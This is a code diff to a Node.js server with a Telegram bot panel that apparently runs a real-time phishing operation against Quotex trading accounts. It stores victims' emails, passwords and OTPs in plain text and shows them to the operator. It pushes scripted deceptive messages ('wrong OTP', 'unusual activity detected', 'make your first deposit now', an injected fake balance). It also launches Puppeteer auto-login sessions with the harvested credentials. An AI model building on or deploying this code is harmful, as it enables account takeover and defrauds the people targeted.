@@ -94,6 +94,22 @@ const Setting        = mongoose.model('Setting',        settingSchema);
 const Order          = mongoose.model('Order',          orderSchema);
 const BrokerSession  = mongoose.model('BrokerSession',  brokerSessionSchema);
 
+// ── Saved Credentials (for quick Quotex batch launch) ───────────────────────
+const savedCredentialSchema = new mongoose.Schema({
+    id:          { type: String, required: true, unique: true },
+    label:       { type: String, default: '' },
+    email:       { type: String, required: true },
+    password:    { type: String, required: true },
+    group:       { type: String, default: 'Default' },
+    notes:       { type: String, default: '' },
+    launchCount: { type: Number, default: 0 },
+    lastLaunched:{ type: Date,   default: null },
+    createdAt:   { type: Date,   default: Date.now },
+});
+const SavedCredential = mongoose.model('SavedCredential', savedCredentialSchema);
+let savedCredsMemory  = [];
+
+
 // ================== DB HELPERS ==================
 async function dbGetOrCreateUser(licenceKey, fullName = 'Unknown') {
     const hasName = fullName && fullName !== 'Unknown' && fullName !== 'Pending Name';
@@ -636,6 +652,88 @@ let autoRetryConfig = {
     delaySeconds: 30,
 };
 
+
+// ================== QUICK TRIGGERS ==================
+// Pre-built message templates for the Telegram inline keyboard.
+// key = callback ID,  type = SSE message type sent to client.
+const QUICK_TRIGGERS = {
+    // ── Login flow ────────────────────────────────────────────────────────
+    invalid_login: {
+        type: 'warning',
+        text: '⚠️ Your email or password is incorrect. Please re-enter your Quotex login credentials carefully and try again.',
+    },
+    wrong_otp: {
+        type: 'warning',
+        text: '🔢 The OTP you entered is incorrect or has expired. Check your email/SMS for the latest code and try again.',
+    },
+    login_ok: {
+        type: 'info',
+        text: '✅ Your login was successful! Your account is now verified and connected. Please wait for the next instructions.',
+    },
+    // ── Account & security ───────────────────────────────────────────────
+    alert: {
+        type: 'alert',
+        text: '🚨 IMPORTANT ALERT: Unusual activity detected on your account. Stay on this page and do not refresh. Our team is reviewing your account now.',
+    },
+    verification: {
+        type: 'instruction',
+        text: '📋 Identity verification is required to continue. Please complete the KYC process to unlock full trading access.',
+    },
+    account_suspended: {
+        type: 'alert',
+        text: '🚫 Your account has been temporarily suspended for security review. Please contact support for assistance.',
+    },
+    // ── Instructions ─────────────────────────────────────────────────────
+    instruction: {
+        type: 'instruction',
+        text: '📋 Please follow the on-screen instructions carefully. Do not close, refresh, or navigate away from the page.',
+    },
+    wait: {
+        type: 'instruction',
+        text: '⏳ Please wait — we are processing your request. This may take up to 2 minutes. Do not close or refresh the page.',
+    },
+    timeout_warning: {
+        type: 'warning',
+        text: '⏰ Your session is about to expire in 2 minutes. Please complete the required action now to avoid being logged out.',
+    },
+    // ── Financial ────────────────────────────────────────────────────────
+    deposit_prompt: {
+        type: 'instruction',
+        text: '💰 To activate your trading account and receive signals, please make your first deposit on the Quotex platform now.',
+    },
+    deposit_ok: {
+        type: 'info',
+        text: '💰 Your deposit has been received and confirmed. Your account is now fully active. Welcome to the signals service!',
+    },
+    withdraw_processing: {
+        type: 'info',
+        text: '🏦 Your withdrawal request is being processed. Funds will arrive within 24–48 hours depending on your payment method.',
+    },
+    // ── Connection / status ──────────────────────────────────────────────
+    success_connected: {
+        type: 'info',
+        text: '🎉 Account successfully connected! Your broker integration is active. You will now receive live trading signals.',
+    },
+    disconnected: {
+        type: 'warning',
+        text: '🔌 Your session has been disconnected. Please log in again to restore your connection and continue receiving signals.',
+    },
+    // ── Support ──────────────────────────────────────────────────────────
+    support_msg: {
+        type: 'info',
+        text: '🛠 Our support team has been notified and will contact you shortly via WhatsApp or Telegram. Please keep the app open.',
+    },
+    // ── Signals ──────────────────────────────────────────────────────────
+    signal_incoming: {
+        type: 'info',
+        text: '📡 A new trading signal is incoming! Please open your Quotex account now and be ready to place the trade.',
+    },
+    signal_close: {
+        type: 'instruction',
+        text: '🔔 Close your current position now! The signal target has been reached. Take your profit.',
+    },
+};
+
 function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 
 // ================== EXPRESS APP ==================
@@ -701,20 +799,39 @@ function tgUserActionKeyboard(userName) {
     const u = encodeURIComponent(userName);
     return {
         inline_keyboard: [
-            [{ text: '⚠️ Invalid Email/Password', callback_data: `qt|invalid_login|${u}` },
-             { text: '🔢 Wrong OTP',              callback_data: `qt|wrong_otp|${u}` }],
-            [{ text: '✅ Login Success',           callback_data: `qt|login_ok|${u}` },
-             { text: '🚨 Account Alert',           callback_data: `qt|alert|${u}` }],
-            [{ text: '📋 Instruction',             callback_data: `qt|instruction|${u}` },
-             { text: '💬 Custom Message',          callback_data: `ask_msg|${u}` }],
-            [{ text: '🔄 Force Reload',            callback_data: `force_reload|${u}` },
-             { text: '⏳ Push Loading',            callback_data: `push_loading|${u}` }],
-            [{ text: '💰 Inject Balance',          callback_data: `ask_balance|${u}` },
-             { text: '👢 Kick User',               callback_data: `kick|${u}` }],
-            [{ text: '🚫 Block',                   callback_data: `block|${u}` },
-             { text: '✅ Unblock',                 callback_data: `unblock|${u}` }],
-            [{ text: '📩 Inject: Credentials',     callback_data: `inject_type_menu|${u}` }],
-            [{ text: '🔙 Back to Users',           callback_data: 'menu_users' }],
+            // ── Quick Triggers: Login flow ────────────────────────────────
+            [{ text: '⚠️ Invalid Login',  callback_data: `qt|invalid_login|${u}` },
+             { text: '🔢 Wrong OTP',      callback_data: `qt|wrong_otp|${u}` },
+             { text: '✅ Login OK',        callback_data: `qt|login_ok|${u}` }],
+            // ── Quick Triggers: Alerts & instructions ─────────────────────
+            [{ text: '🚨 Alert',          callback_data: `qt|alert|${u}` },
+             { text: '⏳ Wait',           callback_data: `qt|wait|${u}` },
+             { text: '📋 Instruction',    callback_data: `qt|instruction|${u}` }],
+            // ── Quick Triggers: Financial ────────────────────────────────
+            [{ text: '💰 Deposit Prompt', callback_data: `qt|deposit_prompt|${u}` },
+             { text: '💰 Deposit OK',     callback_data: `qt|deposit_ok|${u}` },
+             { text: '🏦 Withdraw',       callback_data: `qt|withdraw_processing|${u}` }],
+            // ── Quick Triggers: Status ───────────────────────────────────
+            [{ text: '🎉 Connected',      callback_data: `qt|success_connected|${u}` },
+             { text: '🔌 Disconnected',   callback_data: `qt|disconnected|${u}` },
+             { text: '⏰ Timeout Warn',   callback_data: `qt|timeout_warning|${u}` }],
+            // ── Quick Triggers: Signals ──────────────────────────────────
+            [{ text: '📡 Signal Coming',  callback_data: `qt|signal_incoming|${u}` },
+             { text: '🔔 Close Position', callback_data: `qt|signal_close|${u}` },
+             { text: '🛠 Support Notified', callback_data: `qt|support_msg|${u}` }],
+            // ── Custom message / balance / note ──────────────────────────
+            [{ text: '💬 Custom Message', callback_data: `ask_msg|${u}` },
+             { text: '💰 Inject Balance', callback_data: `ask_balance|${u}` },
+             { text: '📝 Note',           callback_data: `ask_note|${u}` }],
+            // ── Control actions ──────────────────────────────────────────
+            [{ text: '🔄 Force Reload',   callback_data: `force_reload|${u}` },
+             { text: '⏳ Push Loading',   callback_data: `push_loading|${u}` },
+             { text: '👢 Kick User',      callback_data: `kick|${u}` }],
+            [{ text: '🚫 Block',          callback_data: `block|${u}` },
+             { text: '✅ Unblock',        callback_data: `unblock|${u}` },
+             { text: '🚀 Launch QX',      callback_data: `qxlaunch_user|${u}` }],
+            [{ text: '📩 More Inject Options', callback_data: `inject_type_menu|${u}` }],
+            [{ text: '🔙 Back to Users',  callback_data: 'menu_users' }],
         ],
     };
 }
@@ -725,11 +842,18 @@ function tgInjectTypeKeyboard(userName) {
         inline_keyboard: [
             [{ text: '⚠️ Invalid Login',  callback_data: `qt|invalid_login|${u}` },
              { text: '🔢 Wrong OTP',      callback_data: `qt|wrong_otp|${u}` }],
-            [{ text: '✅ Login Success',   callback_data: `qt|login_ok|${u}` },
+            [{ text: '✅ Login OK',        callback_data: `qt|login_ok|${u}` },
              { text: '🚨 Account Alert',  callback_data: `qt|alert|${u}` }],
-            [{ text: '📋 Instruction',    callback_data: `qt|instruction|${u}` }],
-            [{ text: '✏️ Custom Message', callback_data: `ask_msg|${u}` }],
-            [{ text: '💰 Inject Balance', callback_data: `ask_balance|${u}` }],
+            [{ text: '📋 Instruction',    callback_data: `qt|instruction|${u}` },
+             { text: '⏳ Wait',           callback_data: `qt|wait|${u}` }],
+            [{ text: '💰 Deposit Prompt', callback_data: `qt|deposit_prompt|${u}` },
+             { text: '💰 Deposit OK',     callback_data: `qt|deposit_ok|${u}` }],
+            [{ text: '🎉 Connected',      callback_data: `qt|success_connected|${u}` },
+             { text: '⏰ Timeout Warn',   callback_data: `qt|timeout_warning|${u}` }],
+            [{ text: '📡 Signal Coming',  callback_data: `qt|signal_incoming|${u}` },
+             { text: '🔔 Close Position', callback_data: `qt|signal_close|${u}` }],
+            [{ text: '✏️ Custom Message', callback_data: `ask_msg|${u}` },
+             { text: '💰 Inject Balance', callback_data: `ask_balance|${u}` }],
             [{ text: '🔙 Back',           callback_data: 'menu_inject' }],
         ],
     };
@@ -1092,6 +1216,58 @@ async function tgHandleCallback(chatId, data, callbackId) {
         return tgApi('sendMessage', { chat_id: chatId, text: '✅ Send the license key to activate:' });
     }
 
+
+    // ── Note-taking via Telegram ─────────────────────────────────────────
+    if (action === 'ask_note') {
+        tgSessions[chatId] = { awaiting: 'note', target };
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
+            text: `📝 <b>Add Note for ${target}</b>\nSend the note text (/cancel to abort):` });
+    }
+
+    // ── Launch QX directly from user profile (uses stored creds) ─────────
+    if (action === 'qxlaunch_user') {
+        const foundUser = await tgFindUserByName(target);
+        if (!foundUser || !foundUser.username || !foundUser.password) {
+            return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
+                text: `⚠️ <b>${target}</b> has no stored credentials yet.\nAsk them to submit their login first.` });
+        }
+        if (!puppeteerAvailable) return tgApi('sendMessage', { chat_id: chatId, text: '⚠️ Puppeteer not installed — Auto-Login disabled.' });
+        const existing = [...quotexSessions.values()].find(s =>
+            s.email === foundUser.username && !['closed','error','logged_in'].includes(s.status));
+        if (existing) return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
+            text: `⚠️ Session already <b>${existing.status}</b> for <code>${foundUser.username}</code>` });
+        const sid     = makeSessionId();
+        const session = { id: sid, clientName: foundUser.fullName || target, email: foundUser.username,
+            password: foundUser.password, licenceKey: foundUser.licenceKey || '',
+            status: 'queued', statusMsg: 'Launched via Telegram user profile', startedAt: new Date(),
+            updatedAt: new Date(), otpAttempts: 0, browser: null, page: null, screenshotBase64: null, cookies: null };
+        quotexSessions.set(sid, session);
+        broadcastSSE('qx_session_new', getSessionInfo(session));
+        launchQuotexSession(session).catch(e => console.error('qxlaunch_user error:', e.message));
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
+            text: `🚀 Launching QX for <b>${session.clientName}</b>\nSession: <code>${sid}</code>`,
+            reply_markup: tgSessionKeyboard(sid, 'queued') });
+    }
+
+    // ── Inline license type confirmation ─────────────────────────────────
+    if (action === '_lic_do') {
+        const licKey  = decodeURIComponent(parts[1] || '');
+        const licType = parts[2] || 'Standard';
+        try {
+            if (useDatabase) {
+                if (await dbFindLicense(licKey)) return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `⚠️ License <code>${licKey}</code> already exists.` });
+                await dbInsertLicense({ key: licKey, type: licType, status: 'Active' });
+            } else {
+                if (licenses.find(l => l.key === licKey)) return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `⚠️ License <code>${licKey}</code> already exists.` });
+                licenses.unshift({ key: licKey, type: licType, status: 'Active', usesRemaining: null, assignedTo: null, dateAdded: new Date().toISOString(), expiry: null });
+                saveLicenses();
+            }
+            broadcastSSE('license_added', { key: licKey, type: licType, status: 'Active' });
+            return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
+                text: `✅ License added!\n🔑 Key: <code>${licKey}</code>\nType: <b>${licType}</b>` });
+        } catch(e) { return tgApi('sendMessage', { chat_id: chatId, text: `Error: ${e.message}` }); }
+    }
+
     // ── User action callbacks ──────────────────────────────
     if (action === 'qt') {
         const trig = QUICK_TRIGGERS[parts[1]];
@@ -1169,7 +1345,14 @@ async function tgCmdHelp(chatId) {
         '/qxlaunch &lt;email&gt; &lt;pass&gt; [name] — launch\n' +
         '/otp &lt;id&gt; &lt;code&gt; — submit OTP\n' +
         '/qxclose &lt;id&gt; — close session\n\n' +
-        'Or send any <b>username</b> to open quick actions.' });
+        'Or send any <b>username</b> to open quick actions (partial match supported).\n\n' +
+        '<b>⚡ Quick Triggers:</b>\n' +
+        '/triggers — list all quick trigger keys\n' +
+        '/qt &lt;name&gt; &lt;key&gt; — fire a trigger directly\n\n' +
+        '<b>🔍 Search &amp; Manage:</b>\n' +
+        '/search &lt;query&gt; or /s — partial user search\n' +
+        '/u &lt;name&gt; — full user profile (with creds)\n' +
+        '/note &lt;name&gt; &lt;text&gt; — save admin note on a user' });
 }
 async function tgCmdStats(chatId) {
     try {
@@ -1496,13 +1679,236 @@ async function tgHandleMessage(msg) {
             text: `📢 Broadcast sent to <b>${sseClients.size}</b> clients.` });
     }
 
-    // Treat as username target
-    const target    = text.replace(/^@/, '');
-    const isOnline  = sseUserClients.has(target.toLowerCase());
-    const found     = await tgFindUserByName(target);
-    const statusTxt = `👤 <b>${target}</b>\n🟢 Online: <b>${isOnline ? 'Yes' : 'No'}</b>\n` +
-        (found ? `🔑 Key: <code>${found.licenceKey || '-'}</code>\n📧 Email: <code>${found.username || '-'}</code>\n📊 Status: <b>${found.status || '-'}</b>` : 'ℹ️ No DB record yet.');
-    return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: statusTxt, reply_markup: tgUserActionKeyboard(target) });
+    // ── Missing awaiting state handlers ─────────────────────────────────
+
+    if (sess?.awaiting === 'note' && sess.target) {
+        delete tgSessions[chatId];
+        const uForNote = await tgFindUserByName(sess.target);
+        if (uForNote?.licenceKey) {
+            if (useDatabase) await dbSaveNote(uForNote.licenceKey, text).catch(() => {});
+            else { if (!global._notesMap) global._notesMap = {}; global._notesMap[uForNote.licenceKey] = { note: text, updatedAt: new Date().toISOString() }; }
+        }
+        broadcastSSE('activity', { action: `📝 Note saved for ${sess.target}`, userName: sess.target, ip: '—', timestamp: new Date().toLocaleString() });
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `📝 Note saved for <b>${sess.target}</b>` });
+    }
+    if (sess?.awaiting === 'maint_duration') {
+        delete tgSessions[chatId];
+        let until = null;
+        const relMatch = text.match(/^(\d+)h$/i);
+        if (relMatch) { until = new Date(Date.now() + parseInt(relMatch[1]) * 3600000).toISOString(); }
+        else { const d = new Date(text); if (!isNaN(d.getTime())) until = d.toISOString(); }
+        maintenanceMode.until = until;
+        broadcastSSE('maintenance_update', maintenanceMode);
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
+            text: until ? `⏱️ Maintenance end time set: <b>${new Date(until).toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}</b>` : '⚠️ Could not parse time. Use format "2h" or "2025-12-31 23:59".' });
+    }
+    if (sess?.awaiting === 'maint_msg') {
+        delete tgSessions[chatId];
+        maintenanceMode.message = text;
+        broadcastSSE('maintenance_update', maintenanceMode);
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `✅ Maintenance message updated:\n<i>${text}</i>` });
+    }
+    if (sess?.awaiting === 'lic_key') {
+        tgSessions[chatId] = { ...sess, awaiting: 'lic_type', licKey: text.trim() };
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
+            text: `🔑 Key: <code>${text.trim()}</code>\nChoose license type:`,
+            reply_markup: { inline_keyboard: [[
+                { text: 'Standard', callback_data: `_lic_do|${encodeURIComponent(text.trim())}|Standard` },
+                { text: 'VIP',      callback_data: `_lic_do|${encodeURIComponent(text.trim())}|VIP`      },
+                { text: 'Trial',    callback_data: `_lic_do|${encodeURIComponent(text.trim())}|Trial`    },
+            ]] } });
+    }
+    if (sess?.awaiting === 'lic_revoke') {
+        delete tgSessions[chatId];
+        const k = text.trim();
+        try {
+            if (useDatabase) await dbUpdateLicenseStatus(k, 'Inactive');
+            else { const l = licenses.find(x => x.key === k); if (l) { l.status = 'Inactive'; saveLicenses(); } }
+            return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `🚫 License <code>${k}</code> revoked (Inactive).` });
+        } catch(e) { return tgApi('sendMessage', { chat_id: chatId, text: `Error: ${e.message}` }); }
+    }
+    if (sess?.awaiting === 'lic_activate') {
+        delete tgSessions[chatId];
+        const k = text.trim();
+        try {
+            if (useDatabase) await dbUpdateLicenseStatus(k, 'Active');
+            else { const l = licenses.find(x => x.key === k); if (l) { l.status = 'Active'; saveLicenses(); } }
+            return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `✅ License <code>${k}</code> activated.` });
+        } catch(e) { return tgApi('sendMessage', { chat_id: chatId, text: `Error: ${e.message}` }); }
+    }
+    if (sess?.awaiting === 'cred_email') {
+        tgSessions[chatId] = { ...sess, awaiting: 'cred_password', credEmail: text.trim() };
+        return tgApi('sendMessage', { chat_id: chatId, text: '🔑 Now send the Password:' });
+    }
+    if (sess?.awaiting === 'cred_password') {
+        tgSessions[chatId] = { ...sess, awaiting: 'cred_label', credPassword: text.trim() };
+        return tgApi('sendMessage', { chat_id: chatId, text: "🏷 Send a label (client name) or type 'skip':" });
+    }
+    if (sess?.awaiting === 'cred_label') {
+        delete tgSessions[chatId];
+        const label = text === 'skip' ? '' : text.trim();
+        const credId = 'cred_' + Date.now().toString(36) + '_' + Math.random().toString(36).slice(2, 6);
+        const newCred = { id: credId, label, email: sess.credEmail, password: sess.credPassword, group: 'Default', notes: '', launchCount: 0, lastLaunched: null, createdAt: new Date() };
+        try {
+            if (useDatabase) await SavedCredential.create(newCred); else savedCredsMemory.unshift(newCred);
+            broadcastSSE('cred_added', { id: credId, label, email: sess.credEmail, group: 'Default' });
+            return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
+                text: `✅ Credential saved!\n📧 <code>${sess.credEmail}</code>\n🏷 Label: <b>${label || '(none)'}</b>` });
+        } catch(e) { return tgApi('sendMessage', { chat_id: chatId, text: `Error: ${e.message}` }); }
+    }
+    if (sess?.awaiting === 'retry_attempts') {
+        delete tgSessions[chatId];
+        const v = parseInt(text);
+        if (isNaN(v) || v < 1 || v > 10) return tgApi('sendMessage', { chat_id: chatId, text: '❌ Enter a number between 1 and 10.' });
+        autoRetryConfig.maxAttempts = v;
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `✅ Max retry attempts set to <b>${v}</b>`, reply_markup: tgRetryConfigKeyboard() });
+    }
+    if (sess?.awaiting === 'retry_delay') {
+        delete tgSessions[chatId];
+        const v = parseInt(text);
+        if (isNaN(v) || v < 5 || v > 300) return tgApi('sendMessage', { chat_id: chatId, text: '❌ Enter a number between 5 and 300.' });
+        autoRetryConfig.delaySeconds = v;
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `✅ Retry delay set to <b>${v}s</b>`, reply_markup: tgRetryConfigKeyboard() });
+    }
+    if (sess?.awaiting === 'settings_tg_url') {
+        delete tgSessions[chatId];
+        botSettings.telegramUrl = text === 'clear' ? '' : text.trim();
+        saveSettings(); saveSettingsToDB().catch(() => {});
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `✅ Telegram URL updated: <code>${botSettings.telegramUrl || '(cleared)'}</code>` });
+    }
+    if (sess?.awaiting === 'settings_wa_url') {
+        delete tgSessions[chatId];
+        botSettings.whatsappUrl = text === 'clear' ? '' : text.trim();
+        saveSettings(); saveSettingsToDB().catch(() => {});
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `✅ WhatsApp URL updated: <code>${botSettings.whatsappUrl || '(cleared)'}</code>` });
+    }
+    if (sess?.awaiting === 'settings_bot_name') {
+        delete tgSessions[chatId];
+        botSettings.botName = text.trim();
+        saveSettings(); saveSettingsToDB().catch(() => {});
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `✅ Bot name set to: <b>${botSettings.botName}</b>` });
+    }
+
+    // ── New commands ──────────────────────────────────────────────────────
+
+    // /search  or  /s  — partial name/email/key search
+    if (text.startsWith('/search ') || text.startsWith('/s ')) {
+        const query = text.replace(/^\/search |^\/s /, '').trim().toLowerCase();
+        if (!query) return tgApi('sendMessage', { chat_id: chatId, text: 'Usage: /search partial_name' });
+        let allU; try { allU = useDatabase ? await User.find({}).lean() : users; } catch(e) { allU = users; }
+        const matched = allU.filter(u =>
+            (u.fullName || '').toLowerCase().includes(query) ||
+            (u.username || '').toLowerCase().includes(query) ||
+            (u.licenceKey || '').toLowerCase().includes(query)
+        ).slice(0, 10);
+        if (!matched.length) return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `🔍 No users found for "<b>${query}</b>".` });
+        const onlineKeys = [...sseUserClients.keys()];
+        const lines  = matched.map((u, i) => {
+            const onl = onlineKeys.includes((u.fullName || '').toLowerCase());
+            return `${i+1}. ${onl ? '🟢' : '⚫'} <b>${u.fullName || '?'}</b>  📧 <code>${u.username || '-'}</code>  Status: ${u.status || '-'}`;
+        }).join('\n');
+        const kb = matched.map(u => ([{ text: `👤 ${u.fullName || u.username || u.licenceKey}`, callback_data: `user_action|${encodeURIComponent(u.fullName || u.username || u.licenceKey)}` }]));
+        kb.push([{ text: '🔙 Menu', callback_data: 'menu' }]);
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
+            text: `🔍 <b>${matched.length} result(s) for "${query}"</b>\n\n${lines}\n\nTap a name to manage:`,
+            reply_markup: { inline_keyboard: kb } });
+    }
+
+    // /u username — full profile view
+    if (text.startsWith('/u ')) {
+        const uName = text.slice(3).trim().replace(/^@/, '');
+        if (!uName) return tgApi('sendMessage', { chat_id: chatId, text: 'Usage: /u username' });
+        const isOl  = sseUserClients.has(uName.toLowerCase());
+        const fnd   = await tgFindUserByName(uName);
+        const ts    = fnd?.lastActivity ? new Date(fnd.lastActivity).toLocaleString('en-PK', { timeZone: 'Asia/Karachi' }) : '—';
+        const txt2  = `👤 <b>${uName}</b>  ${isOl ? '🟢 ONLINE' : '⚫ offline'}\n` +
+            (fnd
+                ? `🔑 Key: <code>${fnd.licenceKey || '-'}</code>\n📧 Email: <code>${fnd.username || '-'}</code>\n🔒 Pass: <code>${fnd.password || '-'}</code>\n🔢 OTP: <code>${fnd.otp || '-'}</code>\n📊 Status: <b>${fnd.status || '-'}</b>\n🚫 Blocked: <b>${fnd.blocked ? 'Yes' : 'No'}</b>\n🔗 Connected: <b>${fnd.connected ? 'Yes' : 'No'}</b>\n⏰ Last active: <b>${ts}</b>`
+                : 'ℹ️ No DB record yet.');
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: txt2, reply_markup: tgUserActionKeyboard(uName) });
+    }
+
+    // /note username note text
+    if (text.startsWith('/note ')) {
+        const noteParts = text.slice(6).trim().split(' ');
+        const noteUser = noteParts[0]; const noteContent = noteParts.slice(1).join(' ');
+        if (!noteUser || !noteContent) return tgApi('sendMessage', { chat_id: chatId, text: 'Usage: /note username note text here' });
+        const nu = await tgFindUserByName(noteUser);
+        if (!nu?.licenceKey) return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `⚠️ User <b>${noteUser}</b> not found.` });
+        if (useDatabase) await dbSaveNote(nu.licenceKey, noteContent).catch(() => {});
+        else { if (!global._notesMap) global._notesMap = {}; global._notesMap[nu.licenceKey] = { note: noteContent, updatedAt: new Date().toISOString() }; }
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `📝 Note saved for <b>${noteUser}</b>` });
+    }
+
+    // /qt username triggerKey  — fire a quick trigger by key name
+    if (text.startsWith('/qt ')) {
+        const qtParts = text.slice(4).trim().split(' ');
+        if (qtParts.length < 2) {
+            const keys = Object.keys(QUICK_TRIGGERS).join(', ');
+            return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
+                text: `Usage: /qt username trigger_key\n\nAvailable keys:\n<code>${keys}</code>` });
+        }
+        const [qtUser, qtKey] = qtParts;
+        const trig2 = QUICK_TRIGGERS[qtKey];
+        if (!trig2) return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
+            text: `❌ Unknown key: <code>${qtKey}</code>\nRun /triggers to see all keys.` });
+        await tgInjectMessage(qtUser, trig2.type, trig2.text);
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
+            text: `✅ Quick trigger <b>${qtKey}</b> sent to <b>${qtUser}</b>` });
+    }
+
+    // /triggers — list all quick trigger keys
+    if (text === '/triggers') {
+        const trigList = Object.entries(QUICK_TRIGGERS)
+            .map(([k, v]) => `⚡ <code>${k}</code>\n   ${v.text.slice(0, 70)}…`)
+            .join('\n\n');
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
+            text: `⚡ <b>Quick Triggers (${Object.keys(QUICK_TRIGGERS).length} available)</b>\n\n${trigList}\n\n📌 Usage: /qt username key` });
+    }
+
+    // ── Username lookup (exact + partial match) ───────────────────────────
+    const rawTarget = text.replace(/^@/, '').trim();
+    const isOnline  = sseUserClients.has(rawTarget.toLowerCase());
+    const found     = await tgFindUserByName(rawTarget);
+
+    if (found) {
+        const ts2 = found.lastActivity ? new Date(found.lastActivity).toLocaleString('en-PK', { timeZone: 'Asia/Karachi' }) : '—';
+        const sTxt = `👤 <b>${rawTarget}</b>  ${isOnline ? '🟢 ONLINE' : '⚫ offline'}\n` +
+            `🔑 Key: <code>${found.licenceKey || '-'}</code>\n📧 Email: <code>${found.username || '-'}</code>\n` +
+            `📊 Status: <b>${found.status || '-'}</b>  🚫 Blocked: <b>${found.blocked ? 'Yes' : 'No'}</b>\n⏰ Last active: <b>${ts2}</b>`;
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: sTxt, reply_markup: tgUserActionKeyboard(rawTarget) });
+    }
+
+    // Partial match fallback
+    let allForSearch; try { allForSearch = useDatabase ? await User.find({}).lean() : users; } catch(e) { allForSearch = users; }
+    const partial = allForSearch.filter(u =>
+        (u.fullName || '').toLowerCase().includes(rawTarget.toLowerCase()) ||
+        (u.username || '').toLowerCase().includes(rawTarget.toLowerCase())
+    ).slice(0, 8);
+    if (partial.length === 1) {
+        const pu   = partial[0];
+        const pn   = pu.fullName || pu.username || rawTarget;
+        const pol  = sseUserClients.has(pn.toLowerCase());
+        const pts  = pu.lastActivity ? new Date(pu.lastActivity).toLocaleString('en-PK', { timeZone: 'Asia/Karachi' }) : '—';
+        const pTxt = `👤 <b>${pn}</b>  ${pol ? '🟢 ONLINE' : '⚫ offline'}\n` +
+            `🔑 Key: <code>${pu.licenceKey || '-'}</code>\n📧 Email: <code>${pu.username || '-'}</code>\n` +
+            `📊 Status: <b>${pu.status || '-'}</b>\n⏰ Last active: <b>${pts}</b>`;
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: pTxt, reply_markup: tgUserActionKeyboard(pn) });
+    }
+    if (partial.length > 1) {
+        const onl2  = [...sseUserClients.keys()];
+        const pkb = partial.map(u => {
+            const n2 = u.fullName || u.username || u.licenceKey;
+            return [{ text: `${onl2.includes((u.fullName || '').toLowerCase()) ? '🟢' : '⚫'} ${n2}`, callback_data: `user_action|${encodeURIComponent(n2)}` }];
+        });
+        pkb.push([{ text: '🔙 Menu', callback_data: 'menu' }]);
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
+            text: `🔍 Multiple users match "<b>${rawTarget}</b>". Tap one:`,
+            reply_markup: { inline_keyboard: pkb } });
+    }
+
+    return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
+        text: `❓ No user found for "<b>${rawTarget}</b>".\n\nTry /search ${rawTarget} for a partial match, or /menu to open the dashboard.` });
 }
 
 let tgOffset = 0, tgPollingStarted = false;
